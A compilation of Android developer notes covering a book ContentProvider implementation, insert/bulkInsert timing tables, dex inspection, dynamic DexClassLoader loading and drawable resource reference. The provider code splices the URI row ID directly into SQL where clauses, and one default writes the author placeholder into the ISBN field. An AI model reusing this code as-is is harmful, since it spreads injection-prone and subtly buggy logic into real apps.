SQLiteQueryBuilder qb = new SQLiteQueryBuilder();
switch (sUriMatcher.match(uri)) {
case INCOMING_BOOK_COLLECTION_URI_INDICATOR:
qb.setTables(BookTableMetaData.TABLE_NAME);
qb.setProjectionMap(sBooksProjectionMap);
break;
case INCOMING_SINGLE_BOOK_URI_INDICATOR:
qb.setTables(BookTableMetaData.TABLE_NAME);
qb.setProjectionMap(sBooksProjectionMap);
qb.appendWhere(BookTableMetaData._ID + "="
+ uri.getPathSegments().get(1));
break;
default:
throw new IllegalArgumentException("Unknown URI " + uri);
}
// If no sort order is specified use the default
String orderBy;
if (TextUtils.isEmpty(sortOrder)) {
orderBy = BookTableMetaData.DEFAULT_SORT_ORDER;
} else {
orderBy = sortOrder;
}
// Get the database and run the query
SQLiteDatabase db = mOpenHelper.getReadableDatabase();
Cursor c = qb.query(db, projection, selection,
selectionArgs, null, null, orderBy);
//example of getting a count
int i = c.getCount();
// Tell the cursor what uri to watch,
// so it knows when its source data changes
c.setNotificationUri(getContext().getContentResolver(), uri);
return c;
}
@Override
public String getType(Uri uri)
{
switch (sUriMatcher.match(uri)) {
case INCOMING_BOOK_COLLECTION_URI_INDICATOR:
return BookTableMetaData.CONTENT_TYPE;
case INCOMING_SINGLE_BOOK_URI_INDICATOR:
return BookTableMetaData.CONTENT_ITEM_TYPE;
default:
throw new IllegalArgumentException("Unknown URI " + uri);
}
}
@Override
public Uri insert(Uri uri, ContentValues initialValues)
{
// Validate the requested uri
if (sUriMatcher.match(uri)!= INCOMING_BOOK_COLLECTION_URI_INDICATOR)
{
throw new IllegalArgumentException("Unknown URI " + uri);
}
ContentValues values;
if (initialValues != null) {
values = new ContentValues(initialValues);
} else {
values = new ContentValues();
}
Long now = Long.valueOf(System.currentTimeMillis());
// Make sure that the fields are all set
if (values.containsKey(BookTableMetaData.CREATED_DATE) == false)
{
values.put(BookTableMetaData.CREATED_DATE, now);
}
if (values.containsKey(BookTableMetaData.MODIFIED_DATE) == false)
{
values.put(BookTableMetaData.MODIFIED_DATE, now);
}
if (values.containsKey(BookTableMetaData.BOOK_NAME) == false)
{
throw new SQLException(
"Failed to insert row because Book Name is needed " + uri);
}
if (values.containsKey(BookTableMetaData.BOOK_ISBN) == false) {
values.put(BookTableMetaData.BOOK_ISBN, "Unknown ISBN");
}
if (values.containsKey(BookTableMetaData.BOOK_AUTHOR) == false) {
values.put(BookTableMetaData.BOOK_ISBN, "Unknown Author");
}
SQLiteDatabase db = mOpenHelper.getWritableDatabase();
long rowId = db.insert(BookTableMetaData.TABLE_NAME,
BookTableMetaData.BOOK_NAME, values);
if (rowId > 0) {
Uri insertedBookUri =
ContentUris.withAppendedId(
BookTableMetaData.CONTENT_URI, rowId);
getContext()
.getContentResolver()
.notifyChange(insertedBookUri, null);
return insertedBookUri;
}
throw new SQLException("Failed to insert row into " + uri);
}
@Override
public int delete(Uri uri, String where, String[] whereArgs)
{
SQLiteDatabase db = mOpenHelper.getWritableDatabase();
int count;
switch (sUriMatcher.match(uri)) {
case INCOMING_BOOK_COLLECTION_URI_INDICATOR:
count = db.delete(BookTableMetaData.TABLE_NAME,
where, whereArgs);
break;
case INCOMING_SINGLE_BOOK_URI_INDICATOR:
String rowId = uri.getPathSegments().get(1);
count = db.delete(BookTableMetaData.TABLE_NAME,
BookTableMetaData._ID + "=" + rowId
+ (!TextUtils.isEmpty(where) ? " AND (" + where + ')' : ""),
whereArgs);
break;
default:
throw new IllegalArgumentException("Unknown URI " + uri);
}
getContext().getContentResolver().notifyChange(uri, null);
return count;
}
@Override
public int update(Uri uri, ContentValues values,
String where, String[] whereArgs)
{
SQLiteDatabase db = mOpenHelper.getWritableDatabase();
int count;
switch (sUriMatcher.match(uri)) {
case INCOMING_BOOK_COLLECTION_URI_INDICATOR:
count = db.update(BookTableMetaData.TABLE_NAME,
values, where, whereArgs);
break;
case INCOMING_SINGLE_BOOK_URI_INDICATOR:
String rowId = uri.getPathSegments().get(1);
count = db.update(BookTableMetaData.TABLE_NAME,
values, BookTableMetaData._ID + "=" + rowId
+ (!TextUtils.isEmpty(where) ? " AND (" + where + ')' : ""),
whereArgs);
break;
default:
throw new IllegalArgumentException("Unknown URI " + uri);
}
getContext().getContentResolver().notifyChange(uri, null);
return count;
}
}
```
内容提供者的实现需要一个区分不同URI的机制。Android使用一个叫做UriMatcher的类来处理。所以我们需要使用所有包含的URI来构建此类对象。你可以在BookProvider类中创建projection map之后查看到代码示例。接下来我们将在“使用UriMatcher识别URI”节中对UriMatcher类进行讲解。
# 实现MIME类型 ===
BookProvider内容提供者必须实现getType()方法以返回给定URI的MIME类型。这个方法与一些其它内容提供者的方法一样——需要传入URI的重载方法。这个方法的首要任务是区分URI的类型。它是一个集合还是单行数据。
 
根据前面的内容，我们将使用UriMatcher去区分URI的类型。在BookTableMetaData类中已经定义了每类URI所需要返回的MIME类型。你可以查看在BookProvider类中查看这个方法的代码。
# 实现查询方法 ===
内容提供者的query方法根据URI和查询条件返回查询到得结果行的集合。
 
和其它方法一样，query方法使用UriMatcher去辨别URI类型。如果URI类型是单一项类型的（single-item type），这个方法通过如下方式获得book ID。
1.       使用getPathSegments()方法提取路径段
2.       第一个索引段即为book ID
query方法根据projections参数返回对应的列的数据。最后，query方法返回给调用者一个cursor对象。在这个过程中，query方法使用SQLiteQueryBuilder对象表示和执行查询。
# 注册内容提供者 ===
最后，你必须在Android.Manifest.xml文件中使用一下标签结构注册内容提供者：
```xml
<provider android:name=".BookProvider"
android:authorities="com.androidbook.provider.BookProvider"/>
```
# Dalvik Executable Format
 * http://source.android.com/tech/dalvik/dex-format.html
[[TOC]]
# Android Database
# 性能测试
# insert vs. bulkinsert
模拟器:
||= 插入条数 =||= insert=||= bulkinsert=||= notify times[insert:bulkinsert]=||
|| 10    || 250|| 41||  10:1||
|| 100  || 2212|| 150|| 100:1||
|| 1000 || 25465|| 1108||  1000:1||
|| 1000 || 7073|| 1065|| 0:0||
HTC G7:
||= 插入条数 =||= insert=||= bulkinsert=||= notify times[insert:bulkinsert]=||
|| 10    || 423|| 73||  10:1||
|| 100  || 5427|| 113|| 100:1||
|| 1000 || 62663|| 571||  1000:1||
|| 1000 || 46457|| 841|| 0:0||
HTC 1000 条数据不太准确, 因为测试的时候没有申请WakeLock, 手机在亮屏幕和灭屏时会对测试结果产生很大的影响. 灭屏时UI不再刷新, 速度更快一些.
MI2:
||= 插入条数 =||= insert=||= bulkinsert=||= notify times[insert:bulkinsert]=||
|| 10    || 423|| 41||  10:1||
|| 100  || 2212|| 150|| 100:1||
|| 1000 || 25465|| 1108||  1000:1||
|| 1000 || 46457|| 841|| 0:0||
# 内存
# CPU
```
#!sh
$ cat /proc/cpuinfo
```
```
#!sh
$ cat "/sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"
$ cat "/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_min_freq"
$ cat "/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq"
```
 * [http://tldp.org/HOWTO/BogoMips/bogo-faq.html The frequently asked questions about BogoMips]
[[TOC]]
# Handle Large Dex
# 查看Dex文件
```sh
$ dexdump -f classes.dex
Processing 'classes.dex'...
Opened 'classes.dex', DEX version '035'
DEX file header:
magic               : 'dex
035 '
checksum            : cd8d4d84
signature           : ea4b...a4ba
file_size           : 10149144
header_size         : 112
link_size           : 0
link_off            : 0 (0x000000)
string_ids_size     : 82777
string_ids_off      : 112 (0x000070)
type_ids_size       : 9059
type_ids_off        : 331220 (0x050dd4)
field_ids_size      : 42158
field_ids_off       : 515488 (0x07dda0)
method_ids_size     : 63827
method_ids_off      : 852752 (0x0d0310)
class_defs_size     : 7963
class_defs_off      : 1363368 (0x14cda8)
data_size           : 8530960
data_off            : 1618184 (0x18b108)
...
```
```
See vm/LinearAlloc.c and you can find this code: (5MiB under Android 2.3.3, 8MiB after Android 4.0 as my investigation)
#define DEFAULT_MAX_LENGTH (5*1024*1024)
...
LinearAllocHdr* pHdr;
...
pHdr->mapLength = DEFAULT_MAX_LENGTH;
I suppose that the 'Facebook fix' is editing this memory by using native C pointer. IMHO LinearAlloc problem and this method ID problem is different thing.
```
# Content
The Dalvik VM provides facilities for developers to perform custom class loading. Instead of loading Dalvik executable (“dex”) files from the default location, an application can load them from alternative locations such as internal storage or over the network.
This technique is not for every application; In fact, most do just fine without it. However, there are situations where custom class loading can come in handy. Here are a couple of scenarios:
Big apps can contain more than 64K method references, which is the maximum number of supported in a dex file. To get around this limitation, developers can partition part of the program into multiple secondary dex files, and load them at runtime.
Frameworks can be designed to make their execution logic extensible by dynamic code loading at runtime.
We have created a sample app to demonstrate the partitioning of dex files and runtime class loading. (Note that for reasons discussed below, the app cannot be built with the ADT Eclipse plug-in. Instead, use the included Ant build script. See Readme.txt for detail.)
The app has a simple Activity that invokes a library component to display a Toast. The Activity and its resources are kept in the default dex, whereas the library code is stored in a secondary dex bundled in the APK. This requires a modified build process, which is shown below in detail.
Before the library method can be invoked, the app has to first explicitly load the secondary dex file. Let’s take a look at the relevant moving parts.
Code Organization
The application consists of 3 classes.
 * com.example.dex.MainActivity: UI component from which the library is invoked 
 * com.example.dex.LibraryInterface: Interface definition for the library
 * com.example.dex.lib.LibraryProvider: Implementation of the library
The library is packaged in a secondary dex, while the rest of the classes are included in the default (primary) dex file. The “Build process” section below illustrates how to accomplish this. Of course, the packaging decision is dependent on the particular scenario a developer is dealing with.
Class loading and method invocation
The secondary dex file, containing LibraryProvider, is stored as an application asset. First, it has to be copied to a storage location whose path can be supplied to the class loader. The sample app uses the app’s private internal storage area for this purpose. (Technically, external storage would also work, but one has to consider the security implications of keeping application binaries there.)
Below is a snippet from MainActivity where standard file I/O is used to accomplish the copying.
```java
  // Before the secondary dex file can be processed by the DexClassLoader,
  // it has to be first copied from asset resource to a storage location.
  File dexInternalStoragePath = new File(getDir("dex", Context.MODE_PRIVATE),
          SECONDARY_DEX_NAME);
  ...
  BufferedInputStream bis = null;
  OutputStream dexWriter = null;
  static final int BUF_SIZE = 8 * 1024;
  try {
      bis = new BufferedInputStream(getAssets().open(SECONDARY_DEX_NAME));
      dexWriter = new BufferedOutputStream(
          new FileOutputStream(dexInternalStoragePath));
      byte[] buf = new byte[BUF_SIZE];
      int len;
      while((len = bis.read(buf, 0, BUF_SIZE)) > 0) {
          dexWriter.write(buf, 0, len);
      }
      dexWriter.close();
      bis.close();
      
  } catch (. . .) {...}
```
Next, a DexClassLoader is instantiated to load the library from the extracted secondary dex file. There are a couple of ways to invoke methods on classes loaded in this manner. In this sample, the class instance is cast to an interface through which the method is called directly.
Another approach is to invoke methods using the reflection API. The advantage of using reflection is that it doesn’t require the secondary dex file to implement any particular interfaces. However, one should be aware that reflection is verbose and slow.
```java
  // Internal storage where the DexClassLoader writes the optimized dex file to
  final File optimizedDexOutputPath = getDir("outdex", Context.MODE_PRIVATE);
  DexClassLoader cl = new DexClassLoader(dexInternalStoragePath.getAbsolutePath(),
                                         optimizedDexOutputPath.getAbsolutePath(),
                                         null,
                                         getClassLoader());
  Class libProviderClazz = null;
  try {
      // Load the library.
      libProviderClazz =
          cl.loadClass("com.example.dex.lib.LibraryProvider");
      // Cast the return object to the library interface so that the
      // caller can directly invoke methods in the interface.
      // Alternatively, the caller can invoke methods through reflection,
      // which is more verbose. 
      LibraryInterface lib = (LibraryInterface) libProviderClazz.newInstance();
      lib.showAwesomeToast(this, "hello");
  } catch (Exception e) { ... }
```
# Build Process
In order to churn out two separate dex files, we need to tweak the standard build process. To do the trick, we simply modify the “-dex” target in the project’s Ant build.xml.
The modified “-dex” target performs the following operations:
Create two staging directories to store .class files to be converted to the default dex and the secondary dex.
Selectively copy .class files from PROJECT_ROOT/bin/classes to the two staging directories.
```xml
      <!-- Primary dex to include everything but the concrete library
                 implementation. -->
            <copy todir="${out.classes.absolute.dir}.1" >
                <fileset dir="${out.classes.absolute.dir}" >
                        <exclude name="com/example/dex/lib/**" />
                </fileset>
            </copy>
            <!-- Secondary dex to include the concrete library implementation. -->
            <copy todir="${out.classes.absolute.dir}.2" >
                <fileset dir="${out.classes.absolute.dir}" >
                        <include name="com/example/dex/lib/**" />
                </fileset>
            </copy>     
```
Convert .class files from the two staging directories into two separate dex files.
Add the secondary dex file to a jar file, which is the expected input format for the DexClassLoader. Lastly, store the jar file in the “assets” directory of the project.
```xml
    <!-- Package the output in the assets directory of the apk. -->
            <jar destfile="${asset.absolute.dir}/secondary_dex.jar"
                   basedir="${out.absolute.dir}/secondary_dex_dir"
                   includes="classes.dex" />
```
To kick-off the build, you execute ant debug (or release) from the project root directory.
That’s it! In the right situations, dynamic class loading can be quite useful.
l
# 参考
 * http://stackoverflow.com/questions/15508477/android-my-application-is-too-large-and-gives-unable-to-execute-dex-method-id
 * http://android-developers.blogspot.co.il/2011/07/custom-class-loading-in-dalvik.htm
# Android Drwable Resource
|| Bitmap File     || .(png|jpg|gif)文件，生成BitmapDrwable对象
|| Nine-Patch File || A PNG file with stretchable regions to allow image resizing based on content (.9.png). Creates a NinePatchDrawable.
|| Layer List  || A Drawable that manages an array of other Drawables. These are drawn in array order, so the element with the largest index is be drawn on top. Creates a LayerDrawable.
|| State List  || An XML file that references different bitmap graphics for different states (for example, to use a different image when a button is pressed). Creates a StateListDrawable.
|| Level List || An XML file that defines a drawable that manages a number of alternate Drawables, each assigned a maximum numerical value. Creates a LevelListDrawable.
|| Transition Drawable || An XML file that defines a drawable that can cross-fade between two drawable resources. Creates a TransitionDrawable.
|| Inset Drawable || An XML file that defines a drawable that insets another drawable by a specified distance. This is useful when a View needs a background drawble that is smaller than the View's actual bounds.
|| Clip Drawable || An XML file that defines a drawable that clips another Drawable based on this Drawable's current level value. Creates a ClipDrawable.
|| Scale Drawable || An XML file that defines a drawable that changes the size of another Drawable based on its current level value. Creates a ScaleDrawable
|| Shape Drawable || An XML file that defines a geometric shape, including colors and gradients. Creates a ShapeDrawable.
Also see the Animation Resource document for how to create an AnimationDrawable.
```div clas=note
# 注意
ColorResource可以在DrwableXml中使用，如`android:Drwable="@color/red"`
```
Bitmap
A bitmap image. Android supports bitmap files in a three formats: .png (preferred), .jpg (acceptable), .gif (discouraged).
You can reference a bitmap file directly, using the filename as the resource ID, or create an alias resource ID in XML.
Note: Bitmap files may be automatically optimized with lossless image compression by the aapt tool during the build process. For example, a true-color PNG that does not require more than 256 colors may be converted to an 8-bit PNG with a color palette. This will result in an image of equal quality but which requires less memory. So be aware that the image binaries placed in this directory can change during the build. If you plan on reading an image as a bit stream in order to convert it to a bitmap, put your images in the res/raw/ folder instead, where they will not be optimized.
Bitmap File
A bitmap file is a .png, .jpg, or .gif file. Android creates a Drawable resource for any of these files when you save them in the res/drawable/ directory.
file location:
res/drawable/filename.png (.png, .jpg, or .gif)
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a BitmapDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
example:
With an image saved at res/drawable/myimage.png, this layout XML applies the image to a View:
<ImageView
    android:layout_height="wrap_content"
    android:layout_width="wrap_content"
    android:src="@drawable/myimage" />
The following application code retrieves the image as a Drawable:
Resources res = getResources();
Drawable drawable = res.getDrawable(R.drawable.myimage);
see also:
2D Graphics
BitmapDrawable
XML Bitmap
An XML bitmap is a resource defined in XML that points to a bitmap file. The effect is an alias for a raw bitmap file. The XML can specify additional properties for the bitmap such as dithering and tiling.
Note: You can use a <bitmap> element as a child of an <item> element. For example, when creating a state list or layer list, you can exclude the android:drawable attribute from an <item> element and nest a <bitmap> inside it that defines the drawable item.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a BitmapDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<bitmap
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:src="@[package:]drawable/drawable_resource"
    android:antialias=["true" | "false"]
    android:dither=["true" | "false"]
    android:filter=["true" | "false"]
    android:gravity=["top" | "bottom" | "left" | "right" | "center_vertical" |
                      "fill_vertical" | "center_horizontal" | "fill_horizontal" |
                      "center" | "fill" | "clip_vertical" | "clip_horizontal"]
    android:tileMode=["disabled" | "clamp" | "repeat" | "mirror"] />
elements:
<bitmap>
Defines the bitmap source and its properties.
attributes:
xmlns:android
String. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android". This is required only if the <bitmap> is the root element—it is not needed when the <bitmap> is nested inside an <item>.
android:src
Drawable resource. Required. Reference to a drawable resource.
android:antialias
Boolean. Enables or disables antialiasing.
android:dither
Boolean. Enables or disables dithering of the bitmap if the bitmap does not have the same pixel configuration as the screen (for instance: a ARGB 8888 bitmap with an RGB 565 screen).
android:filter
Boolean. Enables or disables bitmap filtering. Filtering is used when the bitmap is shrunk or stretched to smooth its apperance.
android:gravity
Keyword. Defines the gravity for the bitmap. The gravity indicates where to position the drawable in its container if the bitmap is smaller than the container.
Must be one or more (separated by '|') of the following constant values:
Value	Description
top	Put the object at the top of its container, not changing its size.
bottom	Put the object at the bottom of its container, not changing its size.
left	Put the object at the left edge of its container, not changing its size.
right	Put the object at the right edge of its container, not changing its size.
center_vertical	Place object in the vertical center of its container, not changing its size.
fill_vertical	Grow the vertical size of the object if needed so it completely fills its container.
center_horizontal	Place object in the horizontal center of its container, not changing its size.
fill_horizontal	Grow the horizontal size of the object if needed so it completely fills its container.
center	Place the object in the center of its container in both the vertical and horizontal axis, not changing its size.
fill	Grow the horizontal and vertical size of the object if needed so it completely fills its container. This is the default.
clip_vertical	Additional option that can be set to have the top and/or bottom edges of the child clipped to its container's bounds. The clip is based on the vertical gravity: a top gravity clips the bottom edge, a bottom gravity clips the top edge, and neither clips both edges.
clip_horizontal	Additional option that can be set to have the left and/or right edges of the child clipped to its container's bounds. The clip is based on the horizontal gravity: a left gravity clips the right edge, a right gravity clips the left edge, and neither clips both edges.
android:tileMode
Keyword. Defines the tile mode. When the tile mode is enabled, the bitmap is repeated. Gravity is ignored when the tile mode is enabled.
Must be one of the following constant values:
Value	Description
disabled	Do not tile the bitmap. This is the default value.
clamp	Replicates the edge color if the shader draws outside of its original bounds
repeat	Repeats the shader's image horizontally and vertically.
mirror	Repeats the shader's image horizontally and vertically, alternating mirror images so that adjacent images always seam.
example:
<?xml version="1.0" encoding="utf-8"?>
<bitmap xmlns:android="http://schemas.android.com/apk/res/android"
    android:src="@drawable/icon"
    android:tileMode="repeat" />
see also:
BitmapDrawable
Creating alias resources
Nine-Patch
A NinePatch is a PNG image in which you can define stretchable regions that Android scales when content within the View exceeds the normal image bounds. You typically assign this type of image as the background of a View that has at least one dimension set to "wrap_content", and when the View grows to accomodate the content, the Nine-Patch image is also scaled to match the size of the View. An example use of a Nine-Patch image is the background used by Android's standard Button widget, which must stretch to accommodate the text (or image) inside the button.
Same as with a normal bitmap, you can reference a Nine-Patch file directly or from a resource defined by XML.
For a complete discussion about how to create a Nine-Patch file with stretchable regions, see the 2D Graphics document.
Nine-Patch File
file location:
res/drawable/filename.9.png
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a NinePatchDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
example:
With an image saved at res/drawable/myninepatch.9.png, this layout XML applies the Nine-Patch to a View:
<Button
    android:layout_height="wrap_content"
    android:layout_width="wrap_content"
    android:background="@drawable/myninepatch" />
see also:
2D Graphics
NinePatchDrawable
XML Nine-Patch
An XML Nine-Patch is a resource defined in XML that points to a Nine-Patch file. The XML can specify dithering for the image.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a NinePatchDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<nine-patch
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:src="@[package:]drawable/drawable_resource"
    android:dither=["true" | "false"] />
elements:
<nine-patch>
Defines the Nine-Patch source and its properties.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
android:src
Drawable resource. Required. Reference to a Nine-Patch file.
android:dither
Boolean. Enables or disables dithering of the bitmap if the bitmap does not have the same pixel configuration as the screen (for instance: a ARGB 8888 bitmap with an RGB 565 screen).
example:
<?xml version="1.0" encoding="utf-8"?>
<nine-patch xmlns:android="http://schemas.android.com/apk/res/android"
    android:src="@drawable/myninepatch"
    android:dither="false" />
Layer List
A LayerDrawable is a drawable object that manages an array of other drawables. Each drawable in the list is drawn in the order of the list—the last drawable in the list is drawn on top.
Each drawable is represented by an <item> element inside a single <layer-list> element.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a LayerDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<layer-list
    xmlns:android="http://schemas.android.com/apk/res/android" >
    <item
        android:drawable="@[package:]drawable/drawable_resource"
        android:id="@[+][package:]id/resource_name"
        android:top="dimension"
        android:right="dimension"
        android:bottom="dimension"
        android:left="dimension" />
</layer-list>
elements:
<layer-list>
Required. This must be the root element. Contains one or more <item> elements.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
<item>
Defines a drawable to place in the layer drawable, in a position defined by its attributes. Must be a child of a <selector> element. Accepts child <bitmap> elements.
attributes:
android:drawable
Drawable resource. Required. Reference to a drawable resource.
android:id
Resource ID. A unique resource ID for this drawable. To create a new resource ID for this item, use the form: "@+id/name". The plus symbol indicates that this should be created as a new ID. You can use this identifier to retrieve and modify the drawable with View.findViewById() or Activity.findViewById().
android:top
Integer. The top offset in pixels.
android:right
Integer. The right offset in pixels.
android:bottom
Integer. The bottom offset in pixels.
android:left
Integer. The left offset in pixels.
All drawable items are scaled to fit the size of the containing View, by default. Thus, placing your images in a layer list at different positions might increase the size of the View and some images scale as appropriate. To avoid scaling items in the list, use a <bitmap> element inside the <item> element to specify the drawable and define the gravity to something that does not scale, such as "center". For example, the following <item> defines an item that scales to fit its container View:
<item android:drawable="@drawable/image" />
To avoid scaling, the following example uses a <bitmap> element with centered gravity:
<item>
  <bitmap android:src="@drawable/image"
          android:gravity="center" />
</item>
example:
XML file saved at res/drawable/layers.xml:
<?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android">
    <item>
      <bitmap android:src="@drawable/android_red"
        android:gravity="center" />
    </item>
    <item android:top="10dp" android:left="10dp">
      <bitmap android:src="@drawable/android_green"
        android:gravity="center" />
    </item>
    <item android:top="20dp" android:left="20dp">
      <bitmap android:src="@drawable/android_blue"
        android:gravity="center" />
    </item>
</layer-list>
Notice that this example uses a nested <bitmap> element to define the drawable resource for each item with a "center" gravity. This ensures that none of the images are scaled to fit the size of the container, due to resizing caused by the offset images.
This layout XML applies the drawable to a View:
<ImageView
    android:layout_height="wrap_content"
    android:layout_width="wrap_content"
    android:src="@drawable/layers" />
The result is a stack of increasingly offset images:
see also:
LayerDrawable
State List
A StateListDrawable is a drawable object defined in XML that uses a several different images to represent the same graphic, depending on the state of the object. For example, a Button widget can exist in one of several different states (pressed, focused, or niether) and, using a state list drawable, you can provide a different background image for each state.
You can describe the state list in an XML file. Each graphic is represented by an <item> element inside a single <selector> element. Each <item> uses various attributes to describe the state in which it should be used as the graphic for the drawable.
During each state change, the state list is traversed top to bottom and the first item that matches the current state is used—the selection is not based on the "best match," but simply the first item that meets the minimum criteria of the state.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a StateListDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android"
    android:constantSize=["true" | "false"]
    android:dither=["true" | "false"]
    android:variablePadding=["true" | "false"] >
    <item
        android:drawable="@[package:]drawable/drawable_resource"
        android:state_pressed=["true" | "false"]
        android:state_focused=["true" | "false"]
        android:state_hovered=["true" | "false"]
        android:state_selected=["true" | "false"]
        android:state_checkable=["true" | "false"]
        android:state_checked=["true" | "false"]
        android:state_enabled=["true" | "false"]
        android:state_activated=["true" | "false"]
        android:state_window_focused=["true" | "false"] />
</selector>
elements:
<selector>
Required. This must be the root element. Contains one or more <item> elements.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
android:constantSize
Boolean. "true" if the drawable's reported internal size remains constant as the state changes (the size is the maximum of all of the states); "false" if the size varies based on the current state. Default is false.
android:dither
Boolean. "true" to enable dithering of the bitmap if the bitmap does not have the same pixel configuration as the screen (for instance, an ARGB 8888 bitmap with an RGB 565 screen); "false" to disable dithering. Default is true.
android:variablePadding
Boolean. "true" if the drawable's padding should change based on the current state that is selected; "false" if the padding should stay the same (based on the maximum padding of all the states). Enabling this feature requires that you deal with performing layout when the state changes, which is often not supported. Default is false.
<item>
Defines a drawable to use during certain states, as described by its attributes. Must be a child of a <selector> element.
attributes:
android:drawable
Drawable resource. Required. Reference to a drawable resource.
android:state_pressed
Boolean. "true" if this item should be used when the object is pressed (such as when a button is touched/clicked); "false" if this item should be used in the default, non-pressed state.
android:state_focused
Boolean. "true" if this item should be used when the object has input focus (such as when the user selects a text input); "false" if this item should be used in the default, non-focused state.
android:state_hovered
Boolean. "true" if this item should be used when the object is being hovered by a cursor; "false" if this item should be used in the default, non-hovered state. Often, this drawable may be the same drawable used for the "focused" state.
Introduced in API level 14.
android:state_selected
Boolean. "true" if this item should be used when the object is the current user selection when navigating with a directional control (such as when navigating through a list with a d-pad); "false" if this item should be used when the object is not selected.
The selected state is used when focus (android:state_focused) is not sufficient (such as when list view has focus and an item within it is selected with a d-pad).
android:state_checkable
Boolean. "true" if this item should be used when the object is checkable; "false" if this item should be used when the object is not checkable. (Only useful if the object can transition between a checkable and non-checkable widget.)
android:state_checked
Boolean. "true" if this item should be used when the object is checked; "false" if it should be used when the object is un-checked.
android:state_enabled
Boolean. "true" if this item should be used when the object is enabled (capable of receiving touch/click events); "false" if it should be used when the object is disabled.
android:state_activated
Boolean. "true" if this item should be used when the object is activated as the persistent selection (such as to "highlight" the previously selected list item in a persistent navigation view); "false" if it should be used when the object is not activated.
Introduced in API level 11.
android:state_window_focused
Boolean. "true" if this item should be used when the application window has focus (the application is in the foreground), "false" if this item should be used when the application window does not have focus (for example, if the notification shade is pulled down or a dialog appears).
Note: Remember that Android applies the first item in the state list that matches the current state of the object. So, if the first item in the list contains none of the state attributes above, then it is applied every time, which is why your default value should always be last (as demonstrated in the following example).
example:
XML file saved at res/drawable/button.xml:
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true"
          android:drawable="@drawable/button_pressed" /> <!-- pressed -->
    <item android:state_focused="true"
          android:drawable="@drawable/button_focused" /> <!-- focused -->
    <item android:state_hovered="true"
          android:drawable="@drawable/button_focused" /> <!-- hovered -->
    <item android:drawable="@drawable/button_normal" /> <!-- default -->
</selector>
This layout XML applies the state list drawable to a Button:
<Button
    android:layout_height="wrap_content"
    android:layout_width="wrap_content"
    android:background="@drawable/button" />
see also:
StateListDrawable
Level List
A Drawable that manages a number of alternate Drawables, each assigned a maximum numerical value. Setting the level value of the drawable with setLevel() loads the drawable resource in the level list that has a android:maxLevel value greater than or equal to the value passed to the method.
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a LevelListDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<level-list
    xmlns:android="http://schemas.android.com/apk/res/android" >
    <item
        android:drawable="@drawable/drawable_resource"
        android:maxLevel="integer"
        android:minLevel="integer" />
</level-list>
elements:
<level-list>
This must be the root element. Contains one or more <item> elements.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
<item>
Defines a drawable to use at a certain level.
attributes:
android:drawable
Drawable resource. Required. Reference to a drawable resource to be inset.
android:maxLevel
Integer. The maximum level allowed for this item.
android:minLevel
Integer. The minimum level allowed for this item.
example:
<?xml version="1.0" encoding="utf-8"?>
<level-list xmlns:android="http://schemas.android.com/apk/res/android" >
    <item
        android:drawable="@drawable/status_off"
        android:maxLevel="0" />
    <item
        android:drawable="@drawable/status_on"
        android:maxLevel="1" />
</level-list>
Once this is applied to a View, the level can be changed with setLevel() or setImageLevel().
see also:
LevelListDrawable
Transition Drawable
A TransitionDrawable is a drawable object that can cross-fade between the two drawable resources.
Each drawable is represented by an <item> element inside a single <transition> element. No more than two items are supported. To transition forward, call startTransition(). To transition backward, call reverseTransition().
file location:
res/drawable/filename.xml
The filename is used as the resource ID.
compiled resource datatype:
Resource pointer to a TransitionDrawable.
resource reference:
In Java: R.drawable.filename
In XML: @[package:]drawable/filename
syntax:
<?xml version="1.0" encoding="utf-8"?>
<transition
xmlns:android="http://schemas.android.com/apk/res/android" >
    <item
        android:drawable="@[package:]drawable/drawable_resource"
        android:id="@[+][package:]id/resource_name"
        android:top="dimension"
        android:right="dimension"
        android:bottom="dimension"
        android:left="dimension" />
</transition>
elements:
<transition>
Required. This must be the root element. Contains one or more <item> elements.
attributes:
xmlns:android
String. Required. Defines the XML namespace, which must be "http://schemas.android.com/apk/res/android".
<item>
Defines a drawable to use as part of the drawable transition. Must be a child of a <transition> element. Accepts child <bitmap> elements.
attributes:
android:drawable
Drawable resource. Required. Reference to a drawable resource.
android:id
